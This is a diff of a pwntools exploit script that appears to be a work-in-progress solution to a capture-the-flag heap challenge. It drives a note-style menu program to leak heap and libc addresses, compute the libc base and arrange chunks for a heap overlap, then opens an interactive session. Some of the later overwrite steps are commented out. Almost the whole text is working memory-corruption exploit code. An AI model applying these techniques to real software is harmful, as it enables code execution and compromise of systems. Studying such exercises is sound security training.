@@ -4,7 +4,8 @@ from pwn import *
 context.update(
         arch="amd64",
         endian="little",
-        log_level="debug",
+        #log_level="debug",
+        log_level="info",
         os="linux",
         terminal=["alacritty","-e"]
 )
@@ -38,7 +39,7 @@ def create(p, size, value):
     ru(p,b"size?")
     sl(p,b"%i" % size)
     ru(p,b"str?")
-    sl(p,value)
+    s(p,value)
 
 def edit(p, index, value):
     ru(p,b"exit\n")
@@ -62,33 +63,50 @@ def delete(p, index):
 
 
 def exploit(p,e,l):
-    create(p, 0x508, b"A" * 0x508)
-    create(p, 0x18, b"A" * 0x18 )
 
-    delete(p,0)
-    create(p, 0x508, b"")
 
-    pause()
+    for i in range(3):
+        create(p,0x518,b"A" * 0x518)
+        create(p,0x18,b"GUARD")
+        
 
-    libc_leak = edit(p, 0, b"\x0a")
+    for i in range(3):
+        delete(p,i)
+    
+    
+    create(p,0x518,b"A"*8)
+    create(p,0x518,b"A"*8)
 
+    heap_leak = edit(p,0, b"\xff")
+    heap_leak = heap_leak[9:]
+    heap_leak = u64(heap_leak.ljust(8,b"\x00"))
+    log.info(f"Found heap leak {hex(heap_leak)}")
+
+    libc_leak = edit(p,1,b"\xff")
+    libc_leak = libc_leak[9:]
     libc_leak = u64(libc_leak.ljust(8,b"\x00"))
-    libc_base = libc_leak - 0x3ebca0
+    libc_base = libc_leak - (l.sym["main_arena"] + 96)
 
     log.info(f"Found libc leak {hex(libc_leak)}")
     log.info(f"Resolved libc base {hex(libc_base)}")
 
-    delete(p,0)
-    delete(p,1)
 
-    create(p, 0x508, b"B" * 0x4f0 + p64(0x280) + b"B" * 0x10)
-    create(p, 0x88, b"C" * 0x88)
+    for i in range(7):
+        delete(p,i)
 
-    delete(p, 2)
-    edit(p, 1, b"\x11")
+    pause()
+
+    create(p, 0xf8, b"A" * 0xf8)
+    create(p, 0xf8, b"B")
+    create(p, 0xf8, b"C")
+    #create(p, 0x508, b"B" * 0x4f0 + p64(0x280) + b"B" * 0x10)
+    #create(p, 0x88, b"C" * 0x88)
+
+    #delete(p, 2)
+    #edit(p, 1, b"\x11")
 
 
-    create(p, 0x288, b"1" * 0x278)
+    #create(p, 0x288, b"1" * 0x278)
 
     p.interactive()
 
